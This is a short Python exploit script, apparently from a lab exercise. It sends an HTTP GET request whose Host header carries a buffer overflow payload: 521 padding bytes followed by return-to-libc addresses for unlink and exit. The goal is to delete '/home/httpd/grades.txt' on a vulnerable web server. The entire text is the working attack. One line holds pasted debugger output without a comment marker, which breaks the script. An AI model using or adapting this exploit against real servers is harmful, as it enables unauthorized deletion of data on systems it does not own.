import sys, socket, struct, urllib

# Use in the form "python httppattern.py host port"

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

unlink = struct.pack('<L', 0x40102450) $1 = {<text variable, no debug info>} 0x40102450 <unlink>
str = struct.pack('<L', 0xbfffde18) #location of /home/httpd/grades.txt string
exit = struct.pack('<L', 0x40058150) #$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>

exploit = "A" * 521 + unlink + exit + str

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address

command = "GET / HTTP/1.1\r\nHost: " + host + exploit + "/home/httpd/grades.txt" + "\r\nConnection: Close\r\n\r\n"
client.send(command) # Send the command
data = client.recv(1024) # Recieve Reply
client.close() # Close the Connection
